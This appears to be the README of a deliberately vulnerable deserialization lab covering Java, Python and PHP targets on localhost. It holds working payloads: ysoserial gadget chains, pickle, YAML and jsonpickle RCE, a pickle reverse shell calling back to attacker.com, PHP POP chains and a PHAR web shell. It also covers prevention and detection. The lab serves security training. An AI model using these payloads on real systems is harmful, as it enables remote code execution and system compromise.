# Deserialization Vulnerabilities Lab

## Overview
This lab demonstrates insecure deserialization vulnerabilities across three major programming languages: Java, Python, and PHP. Each instance showcases different exploitation techniques and attack vectors.

## Quick Start

**Java Application**: http://localhost:8092

**Python Application**: http://localhost:5000

**PHP Application**: http://localhost:8095

## Deserialization Basics

Deserialization vulnerabilities occur when untrusted data is deserialized without proper validation, allowing attackers to execute arbitrary code or manipulate application logic.

## Java Deserialization

### Access
**URL**: http://localhost:8092

**Vulnerable Endpoints**:
- `/deserialize` - Direct deserialization
- `/readObject` - ObjectInputStream
- `/xmldecode` - XMLDecoder vulnerability

### Java Exploitation

#### 1. Basic Java Deserialization
```java
// Vulnerable code
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject(); // Dangerous!
```

#### 2. Generate Payload with ysoserial
```bash
# Download ysoserial
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# Generate CommonsCollections1 payload
java -jar ysoserial.jar CommonsCollections1 "touch /tmp/pwned" > payload.bin

# Send to application
curl -X POST http://localhost:8092/deserialize \
  -H "Content-Type: application/octet-stream" \
  --data-binary @payload.bin
```

#### 3. Available Gadget Chains
```bash
# List all gadgets
java -jar ysoserial.jar

# Common gadgets:
# - CommonsCollections1-7
# - Spring1, Spring2
# - Groovy1
# - JRMPClient
# - JBossInterceptors1
# - JSON1
# - JavassistWeld1
# - Jython1
# - MozillaRhino1
# - Myfaces1
# - ROME
# - Hibernate1, Hibernate2
```

#### 4. Custom Exploit Class
```java
import java.io.*;

public class Exploit implements Serializable {
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        Runtime.getRuntime().exec("calc.exe");
    }
}
```

### Java Prevention
```java
// Use allowlist for deserialization
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "java.base/*;!*"
);
ois.setObjectInputFilter(filter);

// Or use JSON instead
String json = new ObjectMapper().writeValueAsString(object);
```

## Python Deserialization

### Access
**URL**: http://localhost:5000

**Vulnerable Endpoints**:
- `/pickle` - Pickle deserialization
- `/yaml` - YAML deserialization
- `/jsonpickle` - JSONPickle vulnerability

### Python Exploitation

#### 1. Pickle RCE
```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('touch /tmp/pickle_pwned',))

# Generate payload
payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)

# Send to application
import requests
requests.post('http://localhost:5000/pickle', data={'data': payload})
```

#### 2. Advanced Pickle Payload
```python
import pickle
import base64

# Reverse shell payload
class ReverseShell:
    def __reduce__(self):
        import socket,subprocess,os
        return (exec, ('''
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("attacker.com",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
''',))

payload = base64.b64encode(pickle.dumps(ReverseShell())).decode()
```

#### 3. YAML Exploitation
```python
# Vulnerable YAML parsing
import yaml
yaml.load(user_input)  # Dangerous!

# Exploit
payload = """
!!python/object/apply:os.system
args: ['cat /etc/passwd > /tmp/yaml_pwned']
"""

# Safe alternative
yaml.safe_load(user_input)  # Safe
```

#### 4. JSONPickle Exploitation
```python
import jsonpickle

# Create malicious object
class Malicious:
    def __init__(self):
        self.cmd = "__import__('os').system('whoami')"
    
    def __reduce__(self):
        return (eval, (self.cmd,))

# Serialize
evil_json = jsonpickle.encode(Malicious())
print(evil_json)
```

### Python Prevention
```python
# Never use pickle with untrusted data
# Use JSON for serialization
import json
data = json.dumps(obj)

# If pickle is required, use hmac
import hmac
import hashlib

def sign_data(data, secret):
    return hmac.new(secret, data, hashlib.sha256).hexdigest()

def verify_and_load(data, signature, secret):
    expected_sig = sign_data(data, secret)
    if hmac.compare_digest(signature, expected_sig):
        return pickle.loads(data)
    raise ValueError("Invalid signature")
```

## PHP Deserialization

### Access
**URL**: http://localhost:8095

**Vulnerable Endpoints**:
- `/unserialize` - PHP unserialize()
- `/wakeup` - __wakeup() exploitation
- `/phar` - PHAR deserialization

### PHP Exploitation

#### 1. Basic PHP Object Injection
```php
// Vulnerable code
$data = unserialize($_POST['data']);

// Exploit class
class Evil {
    public $cmd;
    
    function __construct() {
        $this->cmd = "system('id');";
    }
    
    function __destruct() {
        eval($this->cmd);
    }
}

// Generate payload
$obj = new Evil();
$serialized = serialize($obj);
echo base64_encode($serialized);
// Output: TzoxOiJFdmlsIjoxOntzOjM6ImNtZCI7czoxMjoic3lzdGVtKCdpZCcpOyI7fQ==
```

#### 2. POP Chain Exploitation
```php
// Example gadget chain
class Gadget1 {
    public $obj;
    
    function __wakeup() {
        $this->obj->execute();
    }
}

class Gadget2 {
    public $cmd;
    
    function execute() {
        system($this->cmd);
    }
}

// Build chain
$g2 = new Gadget2();
$g2->cmd = "cat /etc/passwd";

$g1 = new Gadget1();
$g1->obj = $g2;

echo urlencode(serialize($g1));
```

#### 3. PHAR Deserialization
```php
// Create malicious PHAR
<?php
class Evil {
    function __destruct() {
        system($_GET['cmd']);
    }
}

$phar = new Phar('evil.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->setMetadata(new Evil());
$phar->stopBuffering();

// Trigger via various functions
// file_exists('phar://evil.phar');
// is_dir('phar://evil.phar');
// filesize('phar://evil.phar');
```

#### 4. Session Injection
```php
// If session uses serialize handler
ini_set('session.serialize_handler', 'php_serialize');

// Inject via session upload
$_SESSION['user'] = '|O:4:"Evil":1:{s:3:"cmd";s:10:"cat /etc/passwd";}';
```

### PHP Prevention
```php
// Never unserialize user input
// Use JSON instead
$data = json_decode($_POST['data'], true);

// If serialization is needed, sign it
function safe_serialize($data, $key) {
    $serialized = serialize($data);
    $hash = hash_hmac('sha256', $serialized, $key);
    return $hash . ':' . $serialized;
}

function safe_unserialize($data, $key) {
    list($hash, $serialized) = explode(':', $data, 2);
    $expected = hash_hmac('sha256', $serialized, $key);
    
    if (hash_equals($hash, $expected)) {
        return unserialize($serialized);
    }
    
    throw new Exception('Invalid data');
}
```

## Multi-Language Payloads

### Cross-Platform Gadgets
```python
# Python payload that works with multiple frameworks
{
    "__class__": {
        "__name__": "os",
        "system": "whoami"
    }
}
```

### Universal Techniques
1. **Magic Methods**: `__wakeup()`, `__destruct()`, `__toString()`
2. **Property Injection**: Modify object properties
3. **Type Confusion**: Mixed type handling
4. **Gadget Chains**: Link multiple objects

## Detection and Testing

### Burp Suite Extensions
- Java Deserialization Scanner
- Freddy (Deserialization bug finder)
- PHP Object Injection Check

### Manual Detection
```bash
# Look for serialization indicators
grep -r "unserialize\|pickle\.loads\|readObject" .

# Check for magic bytes
# Java: AC ED 00 05
# Python pickle: 80 03
# PHP: O:, a:
```

### Automated Tools
```bash
# GadgetProbe - Java gadget detection
java -jar GadgetProbe.jar http://localhost:8092/deserialize

# SerializationDumper - Analyze Java objects
java -jar SerializationDumper.jar -r payload.bin
```

## Common Gadget Libraries

### Java
- Apache Commons Collections
- Spring Framework
- Apache Commons BeanUtils
- Groovy
- JRE (JDK 7u21)

### Python
- subprocess
- os
- eval/exec builtins
- importlib
- pickle opcodes

### PHP
- Monolog (RCE)
- Guzzle (FTP SSRF)
- Doctrine (File write)
- SwiftMailer (File read)

## Mitigation Strategies

### General Best Practices
1. **Avoid Native Serialization**: Use JSON/XML with schemas
2. **Input Validation**: Validate before deserializing
3. **Type Checking**: Ensure expected types
4. **Sandboxing**: Isolate deserialization
5. **Monitoring**: Log deserialization events

### Language-Specific
- **Java**: Use ObjectInputFilter, SecurityManager
- **Python**: Never use pickle, use JSON
- **PHP**: Disable unserialize, use JSON

## Learning Objectives
- Understanding serialization formats
- Identifying vulnerable code patterns
- Exploiting magic methods
- Building gadget chains
- Implementing secure alternatives

## Additional Resources
- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- [ysoserial (Java)](https://github.com/frohoff/ysoserial)
- [phpggc (PHP)](https://github.com/ambionics/phpggc)
- [Understanding Java Deserialization](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet) 